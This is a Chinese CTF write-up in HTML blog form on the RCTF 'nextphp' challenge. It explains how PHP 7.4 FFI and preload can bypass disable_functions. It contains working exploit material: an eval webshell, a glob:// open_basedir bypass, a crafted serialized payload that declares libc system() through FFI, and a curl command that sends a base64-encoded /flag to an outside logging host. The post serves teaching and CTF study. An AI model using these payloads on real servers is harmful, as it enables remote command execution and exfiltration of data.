@@ -1,0 +1,362 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,PHP,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>从RCTF nextphp看PHP7.4的FFI绕过disable_functions [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        从RCTF nextphp看PHP7.4的FFI绕过disable_functions
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2019-06-07T08:27:45.000Z">
+        2019-06-07
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h2><p>访问页面，显示源码，是个PHP一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>推测，考察Bypass disable_functions。</p>
+<p>通过<code>?a=phpinfo();</code>查看phpinfo，发现PHP版本为7.4，且open_basedir限制为Web目录：</p>
+<p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/1.png" alt=""></p>
+<p>而disable_functions中不仅过滤了所有PHP命令执行函数，还过滤了mail、dl、putenv等函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</span><br></pre></td></tr></table></figure>
+<p>Bypass disable_functions的方法无非就那几种。黑名单是无法绕过了，因为所有PHP命令执行函数都被严格过滤了；系统是Linux，不存在COM组件绕过；过滤了dl()函数，无法通过扩展库绕过；过滤了mail和putenv等函数，无法通过LD_PRELOAD方式绕过；过滤了pcntl相关函数，无法通过该组件绕过；系统没有ImageMagick组件等等……</p>
+<p>暂时没有思路，那就看下当前Web目录下有啥文件，此时只能查看Web目录，因为open_basedir限制了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=print_r(scandir(&apos;./&apos;));</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/2.png" alt=""></p>
+<p>可以看到有个preload.php。</p>
+<p>难道就没办法Bypass open_basedir了吗？——<strong>使用glob://伪协议</strong></p>
+<p>下面通过glob://伪协议来Bypass open_basedir读取根目录有啥内容，发送之前先进行URL编码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">' '</span>);&#125;;</span><br></pre></td></tr></table></figure>
+<p>可以看到根目录下有个flag，这里读是读不到的，但是已经确定了flag在根目录下：</p>
+<p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/3.png" alt=""></p>
+<p>回到之前，看下preload.php的源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?a=show_source(&apos;preload.php&apos;);</span><br><span class="line">?a=echo(readfile(&apos;preload.php&apos;));</span><br><span class="line">?a=print_r(readfile(&apos;preload.php&apos;));</span><br><span class="line">?a=echo(file_get_contents(&apos;preload.php&apos;));</span><br><span class="line">?a=print_r(file_get_contents(&apos;preload.php&apos;));</span><br></pre></td></tr></table></figure>
+<p>源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>分析下这段代码：A类继承了Serializable类，和Java类似，定义了一个可序列化的类；A类有一个成员变量\$data，是一个数组，数组中是字典，键分别保存了ret、func、arg；新增了__serialize()和__unserialize()函数，未见过的写法，其中__unserialize()和unserialize()均调用了run()函数；__set()和__construct()函数都抛出异常，这里主要是__set()，因为我们无法直接通过set的方式来设置\$data的值了；最后是run()函数，它是反序列化漏洞存在的根源，因为它通过成员变量\$data中的func和arg来实现任意函数调用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br></pre></td></tr></table></figure>
+<p>至此，之前Bypass disable_functions的方法自然是用不了了。但题目是nextphp，PHP版本为7.4且根据其未见过的一些特性可以推测出应该是用到了7.4版本的新特性了。</p>
+<h2 id="0x02-PHP-7-4-新特性"><a href="#0x02-PHP-7-4-新特性" class="headerlink" title="0x02 PHP 7.4 新特性"></a>0x02 PHP 7.4 新特性</h2><h3 id="自定义对象序列化"><a href="#自定义对象序列化" class="headerlink" title="自定义对象序列化"></a>自定义对象序列化</h3><p>在PHP 7.4的时候，增加了__serialize()和__unserialize()函数，可以用来自定义对象的序列化。其实和Java重写readObject()方法类似。</p>
+<h3 id="Preload"><a href="#Preload" class="headerlink" title="Preload"></a>Preload</h3><p>预加载，允许服务器在启动时在内存中加载PHP文件，并使它们永久可用于所有后续请求，主要用来大幅提升IO性能。</p>
+<p>在php.ini中有一项设置名为opcache.preload，用来指定将在服务器启动时编译和执行的PHP文件，文件中定义的所有函数和大多数类都将永久加载到PHP的函数和类表中，并在将来的任何请求的上下文中永久可用。</p>
+<p>在本题的phpino中可以看到该设置选项：</p>
+<p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/4.png" alt=""></p>
+<p>可以看到，该选项设置为preload.php，也就是说服务器在启动时就已经将该文件加载进内存中，后续我们可以直接调用该文件中的类方法即可而无需做多余的操作去加载或包含文件进来。</p>
+<h3 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h3><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。</p>
+<p>FFI的使用分为声明和调用两个部分。</p>
+<p>下面看个简单的使用Demo，从共享库中调用printf()函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// create FFI object, loading libc and exporting function printf()</span></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    <span class="string">"int printf(const char *format, ...);"</span>, <span class="comment">// this is a regular C declaration</span></span><br><span class="line">    <span class="string">"libc.so.6"</span>);</span><br><span class="line"><span class="comment">// call C's printf()</span></span><br><span class="line">$ffi-&gt;printf(<span class="string">"Hello %s!\n"</span>, <span class="string">"world"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>FFI::cdef——创建一个新的FFI对象，可以用于常规C代码的声明，第一个参数为需要声明的C代码，第二个参数为可选项、从哪个共享库中导入；后面直接通过FFI变量调用声明过的C函数即可。</p>
+<p>可在phpinfo中查看FFI是否开启，本题是开启的：</p>
+<p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/5.png" alt=""></p>
+<h2 id="0x03-解题思路"><a href="#0x03-解题思路" class="headerlink" title="0x03 解题思路"></a>0x03 解题思路</h2><p>由前面分析可知以下几点可利用的地方：</p>
+<ul>
+<li>Preload配置已经将preload.php预加载到内存中，可直接利用其中的类方法；</li>
+<li>preload.php中的unserialize()函数会调用run()，而run()存在任意函数调用风险；</li>
+<li>index.php中eval会执行PHP代码，会帮助我们执行preload.php中的反序列化操作；</li>
+</ul>
+<p>结合起来，攻击思路如下：</p>
+<ul>
+<li>先利用FFI特性构造恶意序列化内容，用PHP通过FFI声明和调用C中的system()函数；</li>
+<li>利用index.php中的eval来执行反序列化操作；</li>
+<li>最后调用FFI中声明的system()函数执行命令；</li>
+</ul>
+<p>利用FFI的特性构造恶意序列化内容，因为无法直接通过__set()函数设置成员变量\$data，这里就直接修改其键值即可，使其初始化func的初始值为FFI::cdef、arg的初始值为system：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(char *command);'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="keyword">new</span> A()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到如下序列化内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>构造exp如下，这里利用index.php的eval来限制执行反序列化操作，然后触发run()函数来调用FFI::cdef声明C中的system()函数，然后通过FFI变量调用已声明的system()来执行任意命令，因为可能有特殊编码这里就进行base64加密传送回来：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=unserialize(<span class="string">'C:1:"A":89:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:26:"int system(char *command);";&#125;&#125;'</span>);$a-&gt;ret-&gt;system(<span class="string">'curl xx.ceye.io/?c=`cat /flag|base64`'</span>);</span><br></pre></td></tr></table></figure>
+<p>发送之前，先进行URL编码，最后在ceye收到内容，base64解码即为flag：</p>
+<p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/6.png" alt=""></p>
+<p><strong>小结</strong></p>
+<p>本题巧妙利用了PHP 7.4的新特性FFI来Bypass disable_functions。</p>
+<p>当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。</p>
+<p>也就是说，通过PHP调用C的命令执行函数来绕过。</p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.php.net/manual/en/book.ffi.php" target="_blank" rel="noopener">Foreign Function Interface</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-题目分析"><span class="toc-text">0x01 题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-PHP-7-4-新特性"><span class="toc-text">0x02 PHP 7.4 新特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#自定义对象序列化"><span class="toc-text">自定义对象序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Preload"><span class="toc-text">Preload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FFI"><span class="toc-text">FFI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-解题思路"><span class="toc-text">0x03 解题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-text">0x04 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/" rel="next" title="浅谈几种Bypass disable_functions的方法">
+          浅谈几种Bypass disable_functions的方法
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2019/06/09/探讨XXE防御之setFeature设置/" rel="prev" title="探讨XXE防御之setFeature设置">
+            探讨XXE防御之setFeature设置
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
